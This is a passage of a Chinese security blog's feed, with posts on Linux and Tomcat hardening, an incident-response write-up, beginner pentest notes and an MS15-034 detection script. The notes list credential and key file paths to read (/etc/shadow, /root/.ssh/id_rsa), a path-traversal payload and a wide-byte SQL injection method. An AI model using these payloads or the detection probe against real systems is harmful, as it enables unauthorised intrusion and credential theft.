class="headerlink" title="审计安全"></a>审计安全</h4><p>日志、安全事件记录</p><p>日志服务器的好处在于，每个工作服务器将自己的日志信息发送给日志服务器进行集中管理，即使有人入侵了服务器并将自己的登录信息悄悄删除，但由于日志信息实时与日志服务器同步，保证了日志的完整性。以备工作人员根据日志服务器信息对服务器安全进行评测。建立日志服务器需要修改客户端的配置文件/etc/rsyslog.conf</p><div align="center"><img src="/images/paperimage/linux_sec01.png" alt=""></div><br>需要保留对应类型的日志文件，修改原来对应保存目录为：@日志服务器ip，然后重启rsyslog服务<br><br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart rsyslog</span><br></pre></td></tr></table></figure><br><br>在服务端将配置文件中的后两行注释掉，然后重启rsyslog服务，开启防火墙：<br><div align="center"><img src="/images/paperimage/linux_sec02.png" alt=""></div><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart rsyslog</span><br><span class="line">irewall-cmd  --add-port=514/tcp</span><br></pre></td></tr></table></figure><h3 id="0x02-web服务"><a href="#0x02-web服务" class="headerlink" title="0x02 web服务"></a>0x02 web服务</h3><h4 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h4><p>一、保持升级到最新稳定的版本<br>二、修改默认配置：端口、后台管理目录</p><pre><code>修改server.xmlTomcat默认启动三个端口，8080、8005、8009，8080是默认访问端口，8005是shutdown端口，8009是AJP端口</code></pre><p>三、关闭非必须的服务，删除不必要的文件 </p><pre><code>1. 删除webapps目录下，除开发应用外的其它目录，包括：docs、examples、host-manager、manager和ROOT，执行命令：rm -rf docs  examples  host-manager  manager  ROOT2. 删除conf目录下tomcat-users.xml文件,执行命令：rm -rf tomcat-users.xml3. 清空Tomcat缓存work目录，执行命令：rm -rf Catalina4. 重启Tomcat</code></pre><p>默认 Tomcat 是开启了对war包的热部署的，为了防止被植入木马等恶意程序，因此我们要关闭自动部署。修改Tomcat下的conf文件夹下的server.xml文件,true修改为false。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;font color=&quot;#87CEFF&quot; size=&quot;2&quot;&gt;余生很长，请别太过善良。——《日常》&lt;/font&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;p&gt;前不久参加了一个网络攻防比赛，需要对自己服务器进行安全加固防止别人获取shell，然后结合工作中有时候会遇到服务器是linux系统且无法进行渗透测试的情况，在此了解一下linux服务器是如何进行安全加固和运维的。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>小白知识点(不定期更新...)</title>
    <link href="http://www.f4guo.top/2019/08/23/%E5%B0%8F%E7%99%BD%E7%9F%A5%E8%AF%86%E7%82%B9-%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0/"/>
    <id>http://www.f4guo.top/2019/08/23/小白知识点-不定期更新/</id>
    <published>2019-08-23T02:44:36.000Z</published>
    <updated>2019-10-22T03:01:01.159Z</updated>
    
    <content type="html"><![CDATA[<blockquote><font color="#87CEFF" size="2">有时，对你来说，错误的朋友是一个十全十美的好人，但是你因为错误的原因选择了她，并不是每一个本身是体面人的男人，都必定是你的良人，也不是每一个性情中人的女人，都必定是你的益友。有时，问题不在友人的任何一方，问题在于她们所拥有的友谊类型。——伊丽莎白·坎特《简·奥斯丁之幸福哲学》</font></blockquote><h4 id="网页后缀名"><a href="#网页后缀名" class="headerlink" title="网页后缀名"></a>网页后缀名</h4><p>@Override 重写父类的方法.<br>@Nullable 表示定义的字段可以为空.<br>一般情况下扩展名可以体现出一个网站使用的技术,xxx.html?id=xxx,这个就是普通的html页面,然后通过javascript或者vbscript来接受页面Get的提交 xxx.do?id=xxx, 这样的一般是用Java,和jsp开发的。再比如说用isapi开发的可以是 xx.dll php开发的是 .php 或者 .php3,perl开发的是 .pl .cgi 等等<br>还有很多，就不一一举例了, 总之有很多技术都得靠服务器才能实现.<br><a id="more"></a><br>后缀名.do .jsp有什么区别</p><p>do可能是用struts编的，如果你对java Web有所了解的话，你应该知道struts，一般的jsp就是直接用.jsp结尾，在struts中你可以部署和设定后缀名，其实用tomcat也可以设定后缀名，你得修改一些配置</p><p>有比较大的可能是用STRUTS框架开发的,因为后缀可以自定,也有可能是其它的语言做的</p><p>Struts是一个基于Sun J2EE平台的MVC框架，主要是采用Servlet和JSP技术来实现的。由于Struts能充分满足应用开发的需求，简单易用，敏捷迅速，在过去的一年中颇受关注。<br>Struts把Servlet、JSP、自定义标签和信息资源(message resources)整合到一个统一的框架中，开发人员利用其进行开发时不用再自己编码实现全套MVC模式，极大的节省了时间，<br>所以说Struts是一个非常不错的应用框架。<br>【StrutsIDE：用于Struts辅助开发的一个Eclipse插件】</p><p>使用Struts2框架的页面一般都是以.action结尾的，所以如果我们看到这种URL，可以考虑Struts2漏洞。<br>.do是java，java喜欢这么写没做静态化时候做了静态化之后，才显示.html<br>转载：<a href="https://www.cnblogs.com/XACOOL/p/5361901.html" target="_blank" rel="noopener">https://www.cnblogs.com/XACOOL/p/5361901.html</a></p><h4 id="目录浏览漏洞的预防："><a href="#目录浏览漏洞的预防：" class="headerlink" title="目录浏览漏洞的预防："></a>目录浏览漏洞的预防：</h4><p>IIS中关闭目录浏览功能：在IIS的网站属性中，勾去“目录浏览”选项，重启IIS。</p><p>Apache中关闭目录浏览功能：打开Apache配置文件httpd.conf，查找“Options Indexes FollowSymLinks”，修改为“ Options -Indexes”(减号表示取消，保存退出，重启Apache)。</p><p>Nginx 中默认不会开启目录浏览功能，若您发现当前已开启该功能，可以编辑nginx.conf文件，删除如下两行：autoindex on;autoindex_exact_size on，然后重启Nginx。<br>转载自CSDN博主「谢公子」的原创文章,原文链接：<a href="https://blog.csdn.net/qq_36119192/article/details/86496362" target="_blank" rel="noopener">https://blog.csdn.net/qq_36119192/article/details/86496362</a></p><h4 id="常见的敏感信息路径："><a href="#常见的敏感信息路径：" class="headerlink" title="常见的敏感信息路径："></a>常见的敏感信息路径：</h4><p>Windows系统</p><pre><code>c:\boot.ini // 查看系统版本c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件c:\windows\repair\sam // 存储Windows系统初次安装的密码c:\ProgramFiles\mysql\my.ini // MySQL配置c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码c:\windows\php.ini // php 配置信息</code></pre><p>Linux/Unix系统</p><pre><code>/etc/passwd // 账户信息/etc/shadow // 账户密码文件/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置/usr/local/app/php5/lib/php.ini // PHP相关配置/etc/httpd/conf/httpd.conf // Apache配置文件/etc/my.conf // mysql 配置文件/root/.bash_history          #查看历史命令/root/.mysql_history         #mysql历史命令记录文件/var/lib/mlocate/mlocate.db  #本地所有文件信息/etc/ssh/sshd_config         #ssh配置文件，如果对外开放可看到端口/proc/self/fd/fd[0-9]*(文件标识符)/proc/mounts/porc/config.gz/root/.ssh/authorized_keys      /root/.ssh/id_rsa  /root/.ssh/id_ras.keystore/root/.ssh/known_hosts</code></pre><p>其他程序的配置文件<br>apache：</p><pre><code>/etc/httpd/conf/httpd.conf /etc/apache2/httpd.conf/etc/apache2/apache2.conf</code></pre><p>nginx：</p><pre><code>/etc/nginx/nginx.conf/usr/local/nginx/conf/nginx.conf/usr/local/etc/nginx/nginx.conf</code></pre><p>redis：<br>    /etc/redis.conf<br>index.php?f=../../../../../../etc/passwd</p><h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>使用条件：<br>1、使用addslashes（）函数（提交的符号用“\”转义）；<br>2、数据库设置编码吗为GBK格式。</p><p>原理：前端输入%df时，首先经过addslashes（）转义变成了%df%5c%27，之后，在数据库查询前，因为设置了GBK编码，GBK编码在汉字编码范围内的两个字节都会重新编码为一个汉字。然后，MySQL服务器就会对查询语句进行GBK编码，即%df%5c被编码成了“運”，而单引号就逃逸了出来，从而形成了注入漏洞。</p><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://www.cnblogs.com/XACOOL/p/5361901.html" target="_blank" rel="noopener">index.do为后缀的是什么开发语言？ 有什么技术特点</a><br><a href="https://blog.csdn.net/qq_36119192/article/details/86496362" target="_blank" rel="noopener">https://blog.csdn.net/qq_36119192/article/details/86496362</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;font color=&quot;#87CEFF&quot; size=&quot;2&quot;&gt;有时，对你来说，错误的朋友是一个十全十美的好人，但是你因为错误的原因选择了她，并不是每一个本身是体面人的男人，都必定是你的良人，也不是每一个性情中人的女人，都必定是你的益友。有时，问题不在友人的任何一方，问题在于她们所拥有的友谊类型。——伊丽莎白·坎特《简·奥斯丁之幸福哲学》&lt;/font&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;网页后缀名&quot;&gt;&lt;a href=&quot;#网页后缀名&quot; class=&quot;headerlink&quot; title=&quot;网页后缀名&quot;&gt;&lt;/a&gt;网页后缀名&lt;/h4&gt;&lt;p&gt;@Override 重写父类的方法.&lt;br&gt;@Nullable 表示定义的字段可以为空.&lt;br&gt;一般情况下扩展名可以体现出一个网站使用的技术,xxx.html?id=xxx,这个就是普通的html页面,然后通过javascript或者vbscript来接受页面Get的提交 xxx.do?id=xxx, 这样的一般是用Java,和jsp开发的。再比如说用isapi开发的可以是 xx.dll php开发的是 .php 或者 .php3,perl开发的是 .pl .cgi 等等&lt;br&gt;还有很多，就不一一举例了, 总之有很多技术都得靠服务器才能实现.&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.f4guo.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Web安全" scheme="http://www.f4guo.top/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>记一次应急处理</title>
    <link href="http://www.f4guo.top/2019/07/24/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%A4%84%E7%90%86/"/>
    <id>http://www.f4guo.top/2019/07/24/记一次应急处理/</id>
    <published>2019-07-24T06:24:11.000Z</published>
    <updated>2019-07-27T02:34:31.712Z</updated>
    
    <content type="html"><![CDATA[<blockquote><font color="#87CEFF" size="2">那时的我从没出过远门。我二十一岁，在一所州立大学里混日子，除了追女孩子、各种牌戏、诗歌、小说、买醉的乐趣之外，什么也没学到。我拖延着时间，什么有意义的事情也不做，等着看人生究竟会变成什么样。——托马斯·林奇《往来故土之间》</font></blockquote><h3 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h3><p>元气满满的我今天还差10分钟就到公司了，突然接到领导一个电话，说有个事儿要我外出一趟。说是有家公司被入侵了，让我过去看看，还说要流量分析(后来发现是我在地铁听错了，是日志分析)，我给你讲我就这个表情<a id="more"></a></p><div align="center"><img src="/images/paperimage/mb.jpg" alt=""></div><h3 id="0x01开搞"><a href="#0x01开搞" class="headerlink" title="0x01开搞"></a>0x01开搞</h3><p>一到办公室，连坐都没给我安排一下，让我先扫描一下服务器，我账号过期了，就只好先让远程的老哥用扫描器扫一下。<br>日志分析我之前没搞过，也不知道怎么个操作法。这边我就先快速的扫了几眼，也没发现什么有用的信息。主要看的是系统日志，我问客户有没有web应用的日志，我想居然系统权限都被获取了，有可能是通过web应用进来的，结果客户跟我说没有web日志。</p><p>老哥那边也来消息了，扫描无果。嗯？咋回事捏，而且我扫一下服务器，发现开放的端口也不对，结果客户说对外做了映射，不是同一台服务器。</p><div align="center"><img src="/images/paperimage/jbjx.jpg" alt=""></div><h3 id="0x02进展"><a href="#0x02进展" class="headerlink" title="0x02进展"></a>0x02进展</h3><p>行叭，那咋办嘛？真的就一行一行看呗，我想了一下，客户说服务器在半夜三点左右的时候被重启了一次，于是我就从那个时间附近找找敏感信息，两点左右的日志没敏感操作啊，继续往前看，还是无果，我决定换个思路。<br>在我看第三遍的时候，我就开始怀疑这个了</p><div align="center"><img src="/images/paperimage/yj1.png" alt=""></div><br>往回溯源<br><div align="center"><img src="/images/paperimage/yj2.png" alt=""></div><br>还真就自动重启了呗<br><div align="center"><img src="/images/paperimage/yj3.png" alt=""></div><br>这或许就能解释的通了，客户也突然放松了下来，但他又说了，里面有一些奇怪的ip地址啊进行远程桌面连接，这怎么解释呢？<br>我一看还真是，全是外网ip地址，不会真是被挂vpn搞了吧<br><div align="center"><img src="/images/paperimage/yj4.png" alt=""></div><br><div align="center"><img src="/images/paperimage/yj5.png" alt=""></div><h3 id="0x03意外状况"><a href="#0x03意外状况" class="headerlink" title="0x03意外状况"></a>0x03意外状况</h3><p>我就查了一下介个TermDD是个啥，咱之前没遇见过，看这意思像是远程终端呀，难道是远程桌面连接啥的？本着不懂就别瞎jb说的原则，我百度了一下，全是没用的广告，接着我又Google一下，大佬是这样说的：</p><pre><code>RDP 协议组件 X.224 在协议流中发现一个错误并且中断了客户端连接。事件类型: 错误事件来源: TermDD描述:RDP 的 “DATA ENCRYPTION” 协议组件在协议流中检测到一个错误并且中断了客户机。出现该情况可能的原因如下：    1：有可能你的远程登陆组件出现问题，试试能否能继续远程登陆。    2：有人在攻击你，使用暴力破解的方法登陆你的系统，导致系统拒绝服务。导致的后果就是计算机的远程桌面无法登录了，ping网关地址和外网地址全部正常，唯独远程桌面不能使用，仔细检查了各项服务，也没有发现异常，最后在网上找了很久，终于找到了解决办法！原来是注册表中的“Certificate”子键被损坏，才导致用户无法与终端服务进行正常通信。分析：Certificate子键负责终端服务通信中数据信息的认证和加密，它一旦被损坏，终端服务的协议组件就会检测到错误，中断客户机与终端服务器之间的通信。解决方法：打开注册表编辑器，找到HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermService\Parameters键值，将Certificate键值删除，然后直接重新启动服务器即可。服务器在重新启动后会自动创建该键</code></pre><p>我继续往前翻日志发现，18年以前也有这个问题，不止一处，这应该就是系统本身的问题。</p><div align="center"><img src="/images/paperimage/yj6.png" alt=""></div><br><div align="center"><img src="/images/paperimage/yj7.png" alt=""></div><p>分析用户组也没有发现有新增隐藏用户什么的，看到这儿我觉得十有八九是误报了，因为系统之前被搞过一次，又来的话客户可能是吓着了。也奉劝老表哥们还是注意点哦，如果再执迷不悟…..</p><div align="center"><img src="http://wx3.sinaimg.cn/large/ceeb653ely1g2ppfhe1s6g206l04ye4a.gif" alt=""></div><h3 id="0x04结束语"><a href="#0x04结束语" class="headerlink" title="0x04结束语"></a>0x04结束语</h3><p>事后和同事讨论，能搞到你内网的系统，应该很厉害的，既然拿到了你的系统权限，一般正常点都是隐藏痕迹，谁会明目张胆重启你系统引起你的注意呢？怎么想都不对是不是。因为同事对这个系统做过渗透，讲道理是这样的哈哈哈</p><div align="center"><img src="http://www.gaoxiaogif.com/d/file/201809/44ab425a964d5bbaf3b239b48de7afc1.jpg" alt=""></div><p>参考链接[<a href="https://blog.csdn.net/gguxxing008/article/details/7755328]" target="_blank" rel="noopener">https://blog.csdn.net/gguxxing008/article/details/7755328]</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;font color=&quot;#87CEFF&quot; size=&quot;2&quot;&gt;那时的我从没出过远门。我二十一岁，在一所州立大学里混日子，除了追女孩子、各种牌戏、诗歌、小说、买醉的乐趣之外，什么也没学到。我拖延着时间，什么有意义的事情也不做，等着看人生究竟会变成什么样。——托马斯·林奇《往来故土之间》&lt;/font&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;0x00前言&quot;&gt;&lt;a href=&quot;#0x00前言&quot; class=&quot;headerlink&quot; title=&quot;0x00前言&quot;&gt;&lt;/a&gt;0x00前言&lt;/h3&gt;&lt;p&gt;元气满满的我今天还差10分钟就到公司了，突然接到领导一个电话，说有个事儿要我外出一趟。说是有家公司被入侵了，让我过去看看，还说要流量分析(后来发现是我在地铁听错了，是日志分析)，我给你讲我就这个表情&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.f4guo.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Web安全" scheme="http://www.f4guo.top/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>富文本编辑器</title>
    <link href="http://www.f4guo.top/2019/07/23/%E5%AF%8C%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91%E5%99%A8/"/>
    <id>http://www.f4guo.top/2019/07/23/富文本编辑器/</id>
    <published>2019-07-23T09:27:36.000Z</published>
    <updated>2019-07-27T13:13:47.394Z</updated>
    
    <content type="html"><![CDATA[<blockquote><font color="#87CEFF" size="2">最近听某人说回忆，解释为什么我们总是随着自己老去，愈发的容易想起童年，想起我们最初的时光，只因为——那些最早来的，总是最后一个离开。——唐诺《读者时代》</font></blockquote><p>前人栽树，后人乘凉。</p><p>链接: <a href="https://pan.baidu.com/s/1dqexujlZsrgyjLJx4C-6tw" target="_blank" rel="noopener">https://pan.baidu.com/s/1dqexujlZsrgyjLJx4C-6tw</a> 提取码: 3k25 </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;font color=&quot;#87CEFF&quot; size=&quot;2&quot;&gt;最近听某人说回忆，解释为什么我们总是随着自己老去，愈发的容易想起童年，想起我们最初的时光，只因为——那些最早来的，总是最后一个离开。——唐诺《读者时代》&lt;/font&gt;
&lt;/blockquote
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.f4guo.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Web安全" scheme="http://www.f4guo.top/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>如何挖src的漏洞</title>
    <link href="http://www.f4guo.top/2019/07/17/%E5%A6%82%E4%BD%95%E6%8C%96src%E7%9A%84%E6%BC%8F%E6%B4%9E/"/>
    <id>http://www.f4guo.top/2019/07/17/如何挖src的漏洞/</id>
    <published>2019-07-17T08:41:36.000Z</published>
    <updated>2019-07-27T02:27:07.386Z</updated>
    
    <content type="html"><![CDATA[<blockquote><font color="#87CEFF" size="2">对我来说，青春与意识不到自己的身体有关，而老年则经常与有意识地克服某种不幸或体内的痛苦有关。——梅·萨藤《过去的痛》</font></blockquote><p>看看大佬怎么说！！！<br><a id="more"></a><br>参考：<br><a href="https://mp.weixin.qq.com/s/yEPE3Xxo0_2g3GEKeDAOWg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/yEPE3Xxo0_2g3GEKeDAOWg</a><br>来源：国舜股份</p><p>讲道理其实还是要多实战，道理都懂，我就是懒。</p><div align="center"><img src="/images/paperimage/zb.jpg" alt=""></div>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;font color=&quot;#87CEFF&quot; size=&quot;2&quot;&gt;对我来说，青春与意识不到自己的身体有关，而老年则经常与有意识地克服某种不幸或体内的痛苦有关。——梅·萨藤《过去的痛》&lt;/font&gt;
&lt;/blockquote&gt;
&lt;p&gt;看看大佬怎么说！！！&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.f4guo.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="web安全" scheme="http://www.f4guo.top/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>HTTP.sys远程代码执行漏洞</title>
    <link href="http://www.f4guo.top/2019/07/17/HTTP-sys%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>http://www.f4guo.top/2019/07/17/HTTP-sys远程代码执行漏洞/</id>
    <published>2019-07-17T01:56:50.000Z</published>
    <updated>2019-10-08T01:34:25.798Z</updated>
    
    <content type="html"><![CDATA[<blockquote><font color="#87CEFF" size="2">如果有一天，当工作环境、生活环境和生活条件不再适合你的性格了，那时，且只有那时，你才能寻求改变。——马洛伊·山多尔《草叶集》</font></blockquote><h3 id="0x00-漏洞概述"><a href="#0x00-漏洞概述" class="headerlink" title="0x00 漏洞概述"></a>0x00 漏洞概述</h3><p>远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。 成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。<br>若要利用此漏洞，攻击者必须将经特殊设计的 HTTP 请求发送到受影响的系统。 通过修改 Windows HTTP 堆栈处理请求的方式，此更新可以修复此漏洞。<br>Microsoft 通过协同的漏洞披露渠道了解到此漏洞的信息。 在最初发布此安全公告时，Microsoft 未收到任何表明此漏洞已公开用于攻击用户的信息。<br>来源：<a href="https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2015/ms15-034" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2015/ms15-034</a></p><h3 id="0x01-漏洞检测"><a href="#0x01-漏洞检测" class="headerlink" title="0x01 漏洞检测"></a>0x01 漏洞检测</h3><p>简单检测该漏洞，响应码416说明存在此漏洞。<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v xxx.com  -H <span class="hljs-string">"Host: irrelevant"</span> -H <span class="hljs-string">"Range: bytes=0-18446744073709551615"</span></span><br></pre></td></tr></table></figure></p><a id="more"></a><p>POC<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="hljs-comment">#-*-coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">#检测服务器banner</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_server</span><span class="hljs-params">(url)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">try</span>:</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        head_dict = r.headers</span><br><span class="line">        serinfo = head_dict.get(<span class="hljs-string">"Server"</span>)</span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-string">"Microsoft-IIS"</span> <span class="hljs-keyword">in</span> serinfo:</span><br><span class="line">            ms15_034(url)</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            print(<span class="hljs-string">"The server may not Microsoft IIS!"</span>)</span><br><span class="line">            ms15_034(url)</span><br><span class="line">    <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> msg:</span><br><span class="line">        print(<span class="hljs-string">"Error:&#123;&#125;"</span>.format(msg))</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ms15_034</span><span class="hljs-params">(url)</span>:</span></span><br><span class="line">    head = &#123;<span class="hljs-string">"Range"</span>: <span class="hljs-string">"bytes=0-18446744073709551615"</span>&#125;</span><br><span class="line">    <span class="hljs-keyword">try</span>:</span><br><span class="line">        r = requests.get(url, headers = head)</span><br><span class="line">        <span class="hljs-comment">#或者 "Requested Range Not Satisfiable"在响应包头中</span></span><br><span class="line">        <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">416</span>:</span><br><span class="line">            print(<span class="hljs-string">"Target is vlun!"</span>)</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            print(<span class="hljs-string">"Target is not vlun!"</span>)</span><br><span class="line">    <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> msg:</span><br><span class="line">        print(<span class="hljs-string">"Error:&#123;&#125;"</span>.format(msg))</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:</span><br><span class="line">    url = str(input(<span class="hljs-string">"Input the target_url:"</span>))</span><br><span class="line">    print(<span class="hljs-string">"Start check...."</span>)</span><br><span class="line">    check_server(url)</span><br></pre></td></tr></table></figure></p><h3 id="0x02-漏洞修复"><a href="#0x02-漏洞修复" class="headerlink" title="0x02 漏洞修复"></a>0x02 漏洞修复</h3><p>更新微软官方补丁</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;font color=&quot;#87CEFF&quot; size=&quot;2&quot;&gt;如果有一天，当工作环境、生活环境和生活条件不再适合你的性格了，那时，且只有那时，你才能寻求改变。——马洛伊·山多尔《草叶集》&lt;/font&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;0x00-漏洞概述&quot;&gt;&lt;a href=&quot;#0x00-漏洞概述&quot; class=&quot;headerlink&quot; title=&quot;0x00 漏洞概述&quot;&gt;&lt;/a&gt;0x00 漏洞概述&lt;/h3&gt;&lt;p&gt;远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。 成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。&lt;br&gt;若要利用此漏洞，攻击者必须将经特殊设计的 HTTP 请求发送到受影响的系统。 通过修改 Windows HTTP 堆栈处理请求的方式，此更新可以修复此漏洞。&lt;br&gt;Microsoft 通过协同的漏洞披露渠道了解到此漏洞的信息。 在最初发布此安全公告时，Microsoft 未收到任何表明此漏洞已公开用于攻击用户的信息。&lt;br&gt;来源：&lt;a href=&quot;https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2015/ms15-034&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2015/ms15-034&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;0x01-漏洞检测&quot;&gt;&lt;a href=&quot;#0x01-漏洞检测&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞检测&quot;&gt;&lt;/a&gt;0x01 漏洞检测&lt;/h3&gt;&lt;p&gt;简单检测该漏洞，响应码416说明存在此漏洞。&lt;br&gt;&lt;figure class=&quot;highlight bash hljs&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;curl -v xxx.com  -H &lt;span class=&quot;hljs-string&quot;&gt;&quot;Host: irrelevant&quot;&lt;/span&gt; -H &lt;span class=&quot;hljs-string&quot;&gt;&quot;Range: bytes=0-18446744073709551615&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="安全研究" scheme="http://www.f4guo.top/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="漏洞分析" scheme="http://www.f4guo.top/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>致远OA远程代码执行漏洞</title>
    <link href="http://www.f4guo.top/2019/07/17/%E8%87%B4%E8%BF%9COA%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>http://www.f4guo.top/2019/07/17/致远OA远程代码执行漏洞/</id>
    <published>2019-07-17T01:55:15.000Z</published>
    <updated>2019-08-09T03:34:32.816Z</updated>
    
